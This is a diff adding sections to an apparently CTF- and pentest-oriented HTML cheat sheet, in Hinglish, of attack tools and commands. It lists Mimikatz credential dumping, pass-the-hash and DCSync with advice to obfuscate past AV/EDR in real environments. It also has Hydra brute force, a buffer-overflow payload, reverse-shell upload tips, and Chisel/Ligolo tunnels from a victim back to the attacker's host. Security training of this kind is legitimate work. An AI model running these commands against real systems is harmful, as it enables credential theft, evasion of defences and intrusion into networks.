+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Windows memory se cleartext passwords, hashes, Kerberos tickets nikalo! Admin/SYSTEM access ke baad — sab credentials dump karo.</div>
+    <div class="cmd"><div class="cmd-line">privilege::debug</div><div class="cmd-desc">Pehle ye karo — debug privilege chahiye</div></div>
+    <div class="cmd"><div class="cmd-line">sekurlsa::logonpasswords</div><div class="cmd-desc">Memory se cleartext passwords + hashes</div></div>
+    <div class="cmd"><div class="cmd-line">sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd.exe</div><div class="cmd-desc">Pass-the-Hash — new cmd as user</div></div>
+    <div class="cmd"><div class="cmd-line">lsadump::sam</div><div class="cmd-desc">SAM database dump — local users hashes</div></div>
+    <div class="cmd"><div class="cmd-line">lsadump::dcsync /user:domain\krbtgt</div><div class="cmd-desc">DCSync attack — DC se hashes sync karo (Domain Admin rights chahiye)</div></div>
+    <div class="cmd"><div class="cmd-line">kerberos::list /export</div><div class="cmd-desc">Kerberos tickets export karo</div></div>
+    <div class="warn2"><b>⚠️ AV/EDR detect karta hai Mimikatz ko!</b> Invoke-Mimikatz (PowerShell) ya obfuscated versions use karo real environments mein.</div>
+  </div>
+</div>
+
+</div><!-- ad -->
+
+<!-- ═══════════════════ NETWORK ═══════════════════ -->
+<div class="sheet" id="s-network">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📡</div>
+    <div><div class="tool-name">Wireshark — Packet Analyzer</div></div>
+    <div class="tool-sub"><span class="badge b-g">Network</span> <span class="badge b-y">Traffic Analysis</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Network traffic pakad ke analyze karo! Cleartext credentials dhundho, protocols analyze karo, CTF mein .pcap files decode karo. GUI tool hai — bahut powerful.</div>
+
+    <div class="cmd-label">🔍 Display Filters — Important Ones</div>
+    <div class="cmd"><div class="cmd-line">http</div><div class="cmd-desc">Sirf HTTP traffic dikhao</div></div>
+    <div class="cmd"><div class="cmd-line">http.request.method == "POST"</div><div class="cmd-desc">Sirf POST requests — credentials yahan hoti hain!</div></div>
+    <div class="cmd"><div class="cmd-line">ftp</div><div class="cmd-desc">FTP traffic — cleartext credentials!</div></div>
+    <div class="cmd"><div class="cmd-line">tcp.port == 4444</div><div class="cmd-desc">Specific port ka traffic</div></div>
+    <div class="cmd"><div class="cmd-line">ip.addr == 192.168.1.1</div><div class="cmd-desc">Specific IP ka traffic</div></div>
+    <div class="cmd"><div class="cmd-line">frame contains "password"</div><div class="cmd-desc">Keyword dhundho — "password" text wale frames</div></div>
+    <div class="cmd"><div class="cmd-line">tcp.stream eq 5</div><div class="cmd-desc">TCP stream 5 follow karo</div></div>
+
+    <div class="cmd-label">📋 Useful Actions</div>
+    <div class="cmd"><div class="cmd-line">Right Click → Follow → TCP Stream</div><div class="cmd-desc">Poori conversation ek jagah dekho — credentials clear dikhti hain!</div></div>
+    <div class="cmd"><div class="cmd-line">File → Export Objects → HTTP</div><div class="cmd-desc">HTTP se files extract karo (images, scripts, etc.)</div></div>
+    <div class="cmd"><div class="cmd-line">Statistics → Protocol Hierarchy</div><div class="cmd-desc">Kaunse protocols kitna traffic use kar rahe hain</div></div>
+    <div class="tip2"><b>💡 CTF mein .pcap file mili?</b> FTP aur HTTP traffic pehle dekho — cleartext credentials hoti hain! Follow TCP Stream karo.</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">💻</div>
+    <div><div class="tool-name">tcpdump — CLI Packet Capture</div></div>
+    <div class="tool-sub"><span class="badge b-g">Network</span> <span class="badge b-r">CLI</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Terminal se packets capture karo — GUI nahi chahiye. Server pe capture karo, file save karo, baad mein Wireshark mein open karo.</div>
+    <div class="cmd"><div class="cmd-line">sudo tcpdump <span class="fl">-i</span> <span class="arg">eth0</span></div><div class="cmd-desc">eth0 pe sab traffic dekho</div></div>
+    <div class="cmd"><div class="cmd-line">sudo tcpdump <span class="fl">-i</span> <span class="arg">eth0</span> <span class="fl">-w</span> <span class="arg">capture.pcap</span></div><div class="cmd-desc">File mein save karo</div></div>
+    <div class="cmd"><div class="cmd-line">sudo tcpdump <span class="fl">-i</span> <span class="arg">eth0</span> <span class="arg">port 80</span> <span class="fl">-A</span></div><div class="cmd-desc">Port 80 ka ASCII output</div></div>
+    <div class="cmd"><div class="cmd-line">sudo tcpdump <span class="fl">-i</span> <span class="arg">eth0</span> <span class="arg">host 192.168.1.1</span></div><div class="cmd-desc">Sirf specific host ka traffic</div></div>
+    <div class="cmd"><div class="cmd-line">sudo tcpdump <span class="fl">-r</span> <span class="arg">capture.pcap</span></div><div class="cmd-desc">Saved file padhna</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔎</div>
+    <div><div class="tool-name">Amass + Subfinder — Subdomain Enum</div></div>
+    <div class="tool-sub"><span class="badge b-r">Recon</span> <span class="badge b-y">OSINT</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Domain ke saare subdomains dhundho — passive aur active methods se. Bug bounty aur real pentest mein bahut kaam aata hai.</div>
+    <div class="cmd"><div class="cmd-line">amass enum <span class="fl">-d</span> <span class="arg">target.com</span></div><div class="cmd-desc">Full passive subdomain enum</div></div>
+    <div class="cmd"><div class="cmd-line">amass enum <span class="fl">-active -d</span> <span class="arg">target.com</span> <span class="fl">-o</span> <span class="arg">subs.txt</span></div><div class="cmd-desc">Active + passive — comprehensive</div></div>
+    <div class="cmd"><div class="cmd-line">subfinder <span class="fl">-d</span> <span class="arg">target.com</span> <span class="fl">-o</span> <span class="arg">subs.txt</span></div><div class="cmd-desc">Fast passive enumeration</div></div>
+    <div class="cmd"><div class="cmd-line">subfinder <span class="fl">-d</span> <span class="arg">target.com</span> | httpx <span class="fl">-silent</span></div><div class="cmd-desc">Subdomains dhundho + live check karo</div></div>
+  </div>
+</div>
+
+</div><!-- network -->
+
+<!-- ═══════════════════ MORE TOOLS ═══════════════════ -->
+<div class="sheet" id="s-moretools">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📝</div>
+    <div><div class="tool-name">CeWL + Crunch — Custom Wordlists</div></div>
+    <div class="tool-sub"><span class="badge b-r">Wordlist</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>rockyou.txt fail hua? Custom wordlist banao! CeWL = website spider karke words nikalo. Crunch = pattern se passwords generate karo.</div>
+    <div class="cmd-label">🕷️ CeWL — Website se Wordlist</div>
+    <div class="cmd"><div class="cmd-line">cewl <span class="arg">http://TARGET</span> <span class="fl">-d</span> <span class="arg">3</span> <span class="fl">-m</span> <span class="arg">5</span> <span class="fl">-w</span> <span class="arg">wordlist.txt</span></div><div class="cmd-desc">Depth 3, min 5 chars, output file</div></div>
+    <div class="cmd"><div class="cmd-line">cewl <span class="arg">http://TARGET</span> <span class="fl">--email</span> <span class="fl">-w</span> <span class="arg">emails.txt</span></div><div class="cmd-desc">Email addresses bhi nikalo</div></div>
+    <div class="cmd-label">🔢 Crunch — Pattern Wordlist</div>
+    <div class="cmd"><div class="cmd-line">crunch <span class="arg">8 8</span> <span class="arg">0123456789</span> <span class="fl">-o</span> <span class="arg">nums.txt</span></div><div class="cmd-desc">8 digit numbers — PIN brute force</div></div>
+    <div class="cmd"><div class="cmd-line">crunch <span class="arg">6 8</span> <span class="arg">abcdefghijklmnopqrstuvwxyz0123456789</span> <span class="fl">-o</span> <span class="arg">alphanum.txt</span></div><div class="cmd-desc">6-8 char alphanumeric</div></div>
+    <div class="cmd"><div class="cmd-line">crunch <span class="arg">10 10</span> <span class="fl">-t</span> <span class="arg">Karan@@@@@</span> <span class="fl">-o</span> <span class="arg">custom.txt</span></div><div class="cmd-desc">Pattern: Karan + 5 digits</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">⚡</div>
+    <div><div class="tool-name">Nuclei — Fast Vuln Scanner</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">Scanner</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Thousands of templates se automatic vulnerability scan karo! CVEs, misconfigs, exposed panels, default credentials — sab ek tool mein. Bug bounty mein bahut use hota hai.</div>
+    <div class="cmd"><div class="cmd-line">nuclei <span class="fl">-u</span> <span class="arg">http://TARGET</span></div><div class="cmd-desc">Basic scan — sab templates</div></div>
+    <div class="cmd"><div class="cmd-line">nuclei <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-t</span> <span class="arg">cves/</span></div><div class="cmd-desc">Sirf CVE templates</div></div>
+    <div class="cmd"><div class="cmd-line">nuclei <span class="fl">-l</span> <span class="arg">targets.txt</span> <span class="fl">-t</span> <span class="arg">exposures/</span></div><div class="cmd-desc">Multiple targets — exposed panels check karo</div></div>
+    <div class="cmd"><div class="cmd-line">nuclei <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-severity</span> <span class="arg">critical,high</span></div><div class="cmd-desc">Sirf high/critical vulnerabilities</div></div>
+    <div class="cmd"><div class="cmd-line">nuclei <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-tags</span> <span class="arg">default-login</span></div><div class="cmd-desc">Default credentials check karo</div></div>
+    <div class="cmd"><div class="cmd-line">nuclei <span class="fl">-update-templates</span></div><div class="cmd-desc">Templates update karo — nayi CVEs milegi</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🚀</div>
+    <div><div class="tool-name">Feroxbuster — Fast Directory Brute</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">Fuzzing</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Gobuster ka zyada fast aur feature-rich alternative — Rust mein likha hai! Recursive scanning, auto-tune, resume support — web content dhundhne ka best tool.</div>
+    <div class="cmd"><div class="cmd-line">feroxbuster <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-w</span> <span class="arg">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></div><div class="cmd-desc">Basic recursive scan</div></div>
+    <div class="cmd"><div class="cmd-line">feroxbuster <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-w</span> <span class="arg">wordlist.txt</span> <span class="fl">-x</span> <span class="arg">php,html,txt</span> <span class="fl">-t</span> <span class="arg">100</span></div><div class="cmd-desc">Extensions + 100 threads</div></div>
+    <div class="cmd"><div class="cmd-line">feroxbuster <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">--filter-status</span> <span class="arg">404,403</span></div><div class="cmd-desc">Status codes filter karo</div></div>
+    <div class="cmd"><div class="cmd-line">feroxbuster <span class="fl">--resume-from</span> <span class="arg">ferox-state.json</span></div><div class="cmd-desc">Interrupted scan resume karo</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔍</div>
+    <div><div class="tool-name">Arjun — Hidden HTTP Parameters</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">Parameters</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Web endpoints pe hidden GET/POST parameters dhundho! Developers chhupate nahi — bas document nahi karte. Arjun brute force karta hai parameters.</div>
+    <div class="cmd"><div class="cmd-line">arjun <span class="fl">-u</span> <span class="arg">http://TARGET/api/endpoint</span></div><div class="cmd-desc">GET parameters dhundho</div></div>
+    <div class="cmd"><div class="cmd-line">arjun <span class="fl">-u</span> <span class="arg">http://TARGET/login</span> <span class="fl">-m</span> <span class="arg">POST</span></div><div class="cmd-desc">POST parameters dhundho</div></div>
+    <div class="cmd"><div class="cmd-line">arjun <span class="fl">-u</span> <span class="arg">http://TARGET/page</span> <span class="fl">-w</span> <span class="arg">custom_params.txt</span></div><div class="cmd-desc">Custom wordlist se</div></div>
+    <div class="tip2"><b>💡 CTF Use:</b> /api/user?id=1 — id parameter visible hai. Lekin debug=true ya admin=1 hidden ho sakta hai — Arjun dhundh lega!</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🗃️</div>
+    <div><div class="tool-name">Other Essential Tools</div></div>
+    <div class="tool-sub"><span class="badge b-g">Misc</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="cmd-label">📁 Miscellaneous</div>
+    <div class="cmd"><div class="cmd-line">curl <span class="fl">-s</span> <span class="arg">http://TARGET/api</span> <span class="fl">-H</span> <span class="arg">"Authorization: Bearer TOKEN"</span> | python3 -m json.tool</div><div class="cmd-desc">API request + JSON pretty print</div></div>
+    <div class="cmd"><div class="cmd-line">python3 <span class="fl">-m</span> http.server <span class="arg">8000</span></div><div class="cmd-desc">Quick HTTP server — files serve karo</div></div>
+    <div class="cmd"><div class="cmd-line">wget <span class="fl">-r</span> <span class="arg">http://TARGET/files/</span></div><div class="cmd-desc">Recursively files download karo</div></div>
+    <div class="cmd"><div class="cmd-line">ffuf <span class="fl">-u</span> <span class="arg">http://TARGET/FUZZ</span> <span class="fl">-w</span> <span class="arg">wordlist.txt</span> <span class="fl">-H</span> <span class="arg">"Cookie: session=ABC123"</span></div><div class="cmd-desc">Cookie ke saath authenticated fuzzing</div></div>
+    <div class="cmd"><div class="cmd-line">dirsearch <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-e</span> <span class="arg">php,html,js</span></div><div class="cmd-desc">Dirsearch — gobuster ka alternative</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">--script</span> <span class="arg">http-shellshock</span> <span class="fl">-p</span> <span class="arg">80</span> <span class="arg">TARGET</span></div><div class="cmd-desc">Shellshock vulnerability check</div></div>
+    <div class="cmd"><div class="cmd-line">nc <span class="arg">TARGET 25</span> → EHLO x → VRFY root</div><div class="cmd-desc">SMTP user enumeration manually</div></div>
+    <div class="cmd"><div class="cmd-line">redis-cli <span class="fl">-h</span> <span class="arg">TARGET</span></div><div class="cmd-desc">Redis connect — unauthenticated often!</div></div>
+    <div class="cmd"><div class="cmd-line">mysql <span class="fl">-h</span> <span class="arg">TARGET</span> <span class="fl">-u</span> <span class="arg">root</span> <span class="fl">-p</span></div><div class="cmd-desc">MySQL connect karo</div></div>
+    <div class="cmd"><div class="cmd-line">snmpwalk <span class="fl">-c</span> <span class="arg">public</span> <span class="fl">-v1</span> <span class="arg">TARGET</span></div><div class="cmd-desc">SNMP walk — community string "public" try karo</div></div>
+  </div>
+</div>
+
+</div><!-- moretools -->
+
+<!-- ═══════════════════ REV ENG ═══════════════════ -->
+<div class="sheet" id="s-reveng">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔬</div>
+    <div><div class="tool-name">Ghidra — Reverse Engineering</div></div>
+    <div class="tool-sub"><span class="badge b-p">Rev Eng</span> <span class="badge b-b">NSA Tool</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>NSA ka free reverse engineering tool! Binary files (EXE, ELF, DLL) ko assembly aur C code mein convert karo — bina source code ke logic samjho. CTF binary challenges ke liye zaroori.</div>
+    <div class="cmd-label">🔧 Basic Workflow</div>
+    <div class="cmd"><div class="cmd-line">ghidra → New Project → Import File → Double click binary</div><div class="cmd-desc">Binary open karo</div></div>
+    <div class="cmd"><div class="cmd-line">Analyze → Auto Analyze karo → Decompiler Window dekho</div><div class="cmd-desc">C-like code mil jaayega!</div></div>
+    <div class="cmd"><div class="cmd-line">Symbol Tree → Functions → main() dhundho</div><div class="cmd-desc">Main function se start karo</div></div>
+    <div class="cmd"><div class="cmd-line">Search → Search for Strings → "password", "flag" dhundho</div><div class="cmd-desc">Hardcoded strings nikalo</div></div>
+    <div class="cmd"><div class="cmd-line">Search → Search Memory → Hex pattern</div><div class="cmd-desc">Specific bytes dhundho</div></div>
+    <div class="tip2"><b>💡 CTF Binary Challenge:</b><br>
+strings binary | grep flag → Hardcoded flag?<br>
+ltrace ./binary → Library calls trace karo<br>
+strace ./binary → System calls trace karo<br>
+file binary → Kaunsa architecture, 32/64 bit<br>
+checksec binary → Security features (NX, PIE, ASLR)</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🐛</div>
+    <div><div class="tool-name">GDB + pwndbg — Binary Debugger</div></div>
+    <div class="tool-sub"><span class="badge b-p">Rev Eng</span> <span class="badge b-r">Exploitation</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Linux binaries debug karo — breakpoints set karo, registers dekho, memory dump karo, buffer overflow exploit develop karo. pwndbg = GDB ka powerful extension.</div>
+    <div class="install"><b>pwndbg install:</b> git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh</div>
+    <div class="cmd-label">⚡ GDB Basic Commands</div>
+    <div class="cmd"><div class="cmd-line">gdb <span class="arg">./binary</span></div><div class="cmd-desc">Binary debug karo</div></div>
+    <div class="cmd"><div class="cmd-line">run</div><div class="cmd-desc">Program chalaao</div></div>
+    <div class="cmd"><div class="cmd-line">run <span class="arg">$(python3 -c "print('A'*100)")</span></div><div class="cmd-desc">Input ke saath run karo — overflow test</div></div>
+    <div class="cmd"><div class="cmd-line">break main</div><div class="cmd-desc">main function pe breakpoint</div></div>
+    <div class="cmd"><div class="cmd-line">break *0x401234</div><div class="cmd-desc">Specific address pe breakpoint</div></div>
+    <div class="cmd"><div class="cmd-line">next / step</div><div class="cmd-desc">Next line / Step into function</div></div>
+    <div class="cmd"><div class="cmd-line">info registers</div><div class="cmd-desc">Sab registers dekho</div></div>
+    <div class="cmd"><div class="cmd-line">x/20wx $rsp</div><div class="cmd-desc">Stack ke 20 words hex mein dekho</div></div>
+    <div class="cmd"><div class="cmd-line">disassemble main</div><div class="cmd-desc">main function ki assembly</div></div>
+    <div class="cmd"><div class="cmd-line">cyclic 200</div><div class="cmd-desc">pwndbg — unique pattern generate karo (overflow offset dhundho)</div></div>
+    <div class="cmd"><div class="cmd-line">cyclic -l 0x61616166</div><div class="cmd-desc">Offset pata karo — RIP kahan overwrite hua</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🐍</div>
+    <div><div class="tool-name">pwntools — Exploit Framework</div></div>
+    <div class="tool-sub"><span class="badge b-p">Binary Exploit</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Python library for CTF binary exploitation — buffer overflows, format strings, ROP chains sab Python se automate karo!</div>
+    <div class="cmd"><div class="cmd-line">from pwn import *</div><div class="cmd-desc">Import karo</div></div>
+    <div class="cmd"><div class="cmd-line">p = process('./binary')</div><div class="cmd-desc">Local binary se connect</div></div>
+    <div class="cmd"><div class="cmd-line">p = remote('TARGET', 1337)</div><div class="cmd-desc">Remote service se connect</div></div>
+    <div class="cmd"><div class="cmd-line">payload = b'A' * 64 + p64(win_addr)</div><div class="cmd-desc">Buffer overflow payload — 64 bytes + return address</div></div>
+    <div class="cmd"><div class="cmd-line">p.sendline(payload)</div><div class="cmd-desc">Payload bhejo</div></div>
+    <div class="cmd"><div class="cmd-line">p.interactive()</div><div class="cmd-desc">Shell se interact karo</div></div>
+    <div class="tip2"><b>💡 ROPgadget:</b> <code style="background:#21262d;color:#7ee787;padding:1px 6px;border-radius:3px;font-size:11px;font-family:'Courier New',monospace">ROPgadget --binary ./binary</code> → ROP chain ke liye gadgets dhundho!</div>
+  </div>
+</div>
+
+</div><!-- reveng -->
+
+<!-- ═══════════════════ PIVOTING ═══════════════════ -->
+<div class="sheet" id="s-pivoting">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🚇</div>
+    <div><div class="tool-name">Chisel — TCP Tunneling</div></div>
+    <div class="tool-sub"><span class="badge b-b">Pivoting</span> <span class="badge b-p">Tunneling</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Ek machine se doosri machine tak tunnel banao — firewall bypass karo, internal networks access karo! HTB Pro Labs aur multi-machine challenges mein zaroori.</div>
+
+    <div class="cmd-label">📖 Samajhne ke liye pehle</div>
+    <div class="what"><b>Scenario:</b> Tumhare paas Machine A ka access hai. Machine B direct accessible nahi hai — sirf A ke through. Chisel A pe chalao → B ka traffic tumhare Kali tak aayega!</div>
+
+    <div class="cmd-label">🔄 Reverse Tunnel — Most Common</div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Kali pe (Server):</span><br>chisel server <span class="fl">-p</span> <span class="arg">8000</span> <span class="fl">--reverse</span></div><div class="cmd-desc">Kali pe server start karo</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Victim Machine A pe (Client):</span><br>chisel client <span class="arg">KALI_IP:8000</span> <span class="arg">R:9001:MACHINE_B_IP:80</span></div><div class="cmd-desc">Machine B ka port 80 → Kali ke 9001 pe forward</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Ab Kali pe:</span><br>curl http://localhost:9001</div><div class="cmd-desc">Machine B ka port 80 access ho gaya!</div></div>
+
+    <div class="cmd-label">🧦 SOCKS5 Proxy — Puri Network Access</div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Kali server:</span><br>chisel server <span class="fl">-p</span> <span class="arg">8000</span> <span class="fl">--reverse</span></div><div class="cmd-desc">Server start karo</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Victim client:</span><br>chisel client <span class="arg">KALI_IP:8000</span> <span class="arg">R:socks</span></div><div class="cmd-desc">SOCKS5 proxy on Kali port 1080</div></div>
+    <div class="cmd"><div class="cmd-line">proxychains nmap <span class="fl">-sT</span> <span class="arg">INTERNAL_IP</span></div><div class="cmd-desc">Kali se internal machines scan karo!</div></div>
+    <div class="cmd"><div class="cmd-line">proxychains crackmapexec smb <span class="arg">INTERNAL_IP</span></div><div class="cmd-desc">Internal SMB attack proxychains se</div></div>
+
+    <div class="cmd-label">⚙️ /etc/proxychains.conf Setup</div>
+    <div class="cmd"><div class="cmd-line">echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf</div><div class="cmd-desc">SOCKS5 proxy add karo config mein</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🌐</div>
+    <div><div class="tool-name">Ligolo-ng — Advanced Pivot</div></div>
+    <div class="tool-sub"><span class="badge b-b">Pivoting</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Chisel se zyada advanced aur fast tunneling! TUN interface banata hai — poori network seamlessly route ho jaati hai. Modern HTB pro labs mein preferred tool.</div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Kali pe (Proxy server):</span><br>./proxy <span class="fl">-selfcert</span></div><div class="cmd-desc">Ligolo proxy server start karo</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Victim pe (Agent):</span><br>./agent <span class="fl">-connect</span> <span class="arg">KALI_IP:11601</span> <span class="fl">-ignore-cert</span></div><div class="cmd-desc">Agent connect karo Kali se</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Kali Ligolo console mein:</span><br>session → 1 → start</div><div class="cmd-desc">Session select karo aur tunnel start karo</div></div>
+    <div class="cmd"><div class="cmd-line">sudo ip route add <span class="arg">172.16.0.0/24</span> dev ligolo</div><div class="cmd-desc">Internal network ka route add karo</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="arg">172.16.0.1</span></div><div class="cmd-desc">Ab seedha internal IP scan karo! proxychains bhi nahi chahiye!</div></div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔌</div>
+    <div><div class="tool-name">SSH Port Forwarding + Proxychains</div></div>
+    <div class="tool-sub"><span class="badge b-b">Pivoting</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>SSH ke through ports forward karo ya SOCKS proxy banao — extra tools install karne ki zaroorat nahi! SSH available hai toh ye sab possible hai.</div>
+    <div class="cmd-label">Local Port Forward</div>
+    <div class="cmd"><div class="cmd-line">ssh <span class="fl">-L</span> <span class="arg">8080:INTERNAL_IP:80</span> <span class="arg">user@PIVOT_HOST</span></div><div class="cmd-desc">Internal:80 → Kali:8080 pe milega</div></div>
+    <div class="cmd-label">Dynamic SOCKS Proxy</div>
+    <div class="cmd"><div class="cmd-line">ssh <span class="fl">-D</span> <span class="arg">1080</span> <span class="arg">user@PIVOT_HOST</span> <span class="fl">-N</span></div><div class="cmd-desc">SOCKS proxy on port 1080 — puri network access</div></div>
+    <div class="cmd"><div class="cmd-line">proxychains nmap <span class="fl">-sT -Pn</span> <span class="arg">INTERNAL_IP</span></div><div class="cmd-desc">Internal network scan karo</div></div>
+    <div class="cmd-label">Remote Port Forward</div>
+    <div class="cmd"><div class="cmd-line">ssh <span class="fl">-R</span> <span class="arg">9001:localhost:80</span> <span class="arg">user@KALI</span></div><div class="cmd-desc">Victim ka port 80 → Kali ke 9001 pe</div></div>
+    <div class="tip2"><b>💡 No SSH? SSHuttle try karo:</b><br>
+<code style="background:#21262d;color:#7ee787;padding:1px 6px;border-radius:3px;font-size:11px;font-family:'Courier New',monospace">sshuttle -r user@PIVOT_HOST 172.16.0.0/24</code><br>
+Transparent proxy — routing automatically handle ho jaati hai!</div>
+  </div>
+</div>
+
+</div><!-- pivoting -->
+
+<div class="sheet" id="s-ports">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔌</div>
+    <div><div class="tool-name">Common Ports — Attack Guide</div><div class="tool-sub-title">Port milaa → kya karo → kaunsa tool</div></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>How to use</b>Nmap scan ke baad koi port open dikhta hai? Is tab mein dhundho — us port pe kya attack possible hai, kaunsa tool chalao, kya dhundho!</div>
+  </div>
+</div>
+
+<!-- FTP 21 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📁</div>
+    <div><div class="tool-name">Port 21 — FTP (File Transfer Protocol)</div></div>
+    <div class="tool-sub"><span class="badge b-g">Linux</span><span class="badge b-b">Windows</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Anonymous login try karo — FTP ka sabse common vulnerability! Agar nahi toh credentials brute force karo.</div>
+    <div class="cmd-label">Step 1 — Anonymous Login</div>
+    <div class="cmd"><div class="cmd-line">ftp <span class="arg">TARGET_IP</span><br><span class="arg">Username:</span> anonymous<br><span class="arg">Password:</span> anonymous</div><div class="cmd-desc">Anonymous login — koi credentials nahi chahiye!</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-sV -p21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE scripts se auto check karo</div></div>
+    <div class="cmd-label">Step 2 — FTP Commands (andar aane ke baad)</div>
+    <div class="cmd"><div class="cmd-line">ls -la<br>cd /home<br>get secret.txt<br>put shell.php<br>mget * <span class="arg">(sab download karo)</span></div><div class="cmd-desc">FTP prompt mein yeh commands use karo</div></div>
+    <div class="cmd-label">Step 3 — Brute Force (agar anonymous fail hoga)</div>
+    <div class="cmd"><div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">/usr/share/wordlists/rockyou.txt</span> ftp://<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Password brute force</div></div>
+    <div class="tip2"><b>💡 FTP Tips:</b><br>
+    • vsftpd 2.3.4 → backdoor vulnerability! <code>searchsploit vsftpd 2.3.4</code><br>
+    • File upload possible? → reverse shell upload karo (.php, .asp etc.)<br>
+    • Binary mode: FTP mein <code>binary</code> type karo exe/zip download ke liye</div>
+  </div>
+</div>
+
+<!-- SSH 22 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔐</div>
+    <div><div class="tool-name">Port 22 — SSH (Secure Shell)</div></div>
+    <div class="tool-sub"><span class="badge b-g">Linux</span><span class="badge b-b">Windows</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>SSH version check karo, default/weak creds try karo, aur agar koi private key mili ho (id_rsa) toh directly login karo.</div>
+    <div class="cmd-label">Step 1 — Version + Enum</div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-sV -p22 --script ssh-auth-methods,ssh-hostkey</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Auth methods aur hostkey dekho</div></div>
+    <div class="cmd"><div class="cmd-line">nc <span class="arg">TARGET_IP</span> 22</div><div class="cmd-desc">Banner grab — SSH version dikh jaayegi</div></div>
+    <div class="cmd-label">Step 2 — Login with Key</div>
+    <div class="cmd"><div class="cmd-line">chmod 600 id_rsa<br>ssh <span class="fl">-i</span> <span class="arg">id_rsa</span> <span class="arg">user@TARGET_IP</span></div><div class="cmd-desc">Private key mili? Direct login! (find / -name id_rsa)</div></div>
+    <div class="cmd-label">Step 3 — Brute Force</div>
+    <div class="cmd"><div class="cmd-line">hydra <span class="fl">-L</span> <span class="arg">users.txt</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> <span class="arg">TARGET_IP</span> ssh <span class="fl">-t 4</span></div><div class="cmd-desc">Username + password brute force</div></div>
+    <div class="cmd"><div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">root</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> ssh://<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Single user brute force</div></div>
